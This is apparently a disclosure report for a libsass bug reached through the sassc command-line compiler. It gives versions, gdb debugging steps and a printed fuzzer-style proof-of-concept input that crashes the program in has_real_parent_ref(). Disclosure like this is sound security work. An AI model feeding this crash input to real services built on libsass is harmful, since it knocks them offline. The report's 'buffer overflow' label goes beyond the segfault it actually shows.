# libsass has a buffer overflow vulnerability

## 1. Project address
sassc address:
https://github.com/sass/sassc.git
libsass address:
https://github.com/sass/libsass.git

## 2. Project Introduction
Sassc: SassC is a wrapper for libsass (http://github.com/sass/libsass) to generate a useful command-line application that can be installed and packaged for multiple operating systems. SassC currently statically links the libsass library, but may use dynamic linking in the future if libsass supports dynamic linking.
Libsass: LibSass is a C++ port of the original Ruby Sass CSS compiler with a C API.

## 3. Software Version
Sassc 3.6.2
Libsass: 3.6.5-8-g210218
Sass2scss: 1.1.1
Sass: 3.5

## 4. Vulnerability details
POC link download:
https://github.com/sass/sassc/issues/280#issue-1448940448
Appearance: Execute ./sassc poc.txt

![image](https://github.com/user-attachments/assets/a0244fed-283c-4712-b2e5-52cab06c4154)

It will cause a segmentation fault and crash the program.
Use gdb to find out why the program crashed with this input:
gdb --args sassc poc.txt
Type run

![image](https://github.com/user-attachments/assets/d5d201fc-6762-49fe-96e7-908ca575aa8f)
![image](https://github.com/user-attachments/assets/c140b0da-13e5-44e6-ac72-09f762bd1ead)

You can see that the error function is has_real_parent_ref()
Then enter bt to backtrack and view the stack frame

## Vulnerability Exploitation

poc
```
indmport {imp:acr$-p::c_-(6n

OfCi



O
::c_-(6n

OfCi



O

O




f)i
&
Ch),mport>{imp:acr$-p::c_-(6n

OfCi



O
::c_-(6n

OfCi



O

O
f)i
&
Ch),



:acr$-p::c_-(6n

OfCi



O
::c_-(6n

OfCi



O

O




f)i
&
Ch),mport {imp:acr$-acr$-p::c_-(6n

OfCi



O
::c_-(6n

OfCi



O

O




f)i
&
Ch),mport {imp:acr$-p::c_JJ{}}mmqo|t {iF#FFmmqo|t {imp:ac&&F&&&/&&fro
}mp:ac&&&&&&/&&fro
}@c_-(6n-p::c_-(6n

OfCi



O
::c


O

O




f)i
&
O
O
f)i
&
Ch);



JJ{}}@c_-(6n

OfCJJ{}}@c_-(6n

OfC



JJ{}}@c_-(6
```
By injecting malicious POC, the program that calls the libsass library will fall into an infinite loop and crash.

![image](https://github.com/user-attachments/assets/7996342a-809a-4cd2-abd4-65a9dad654b6)
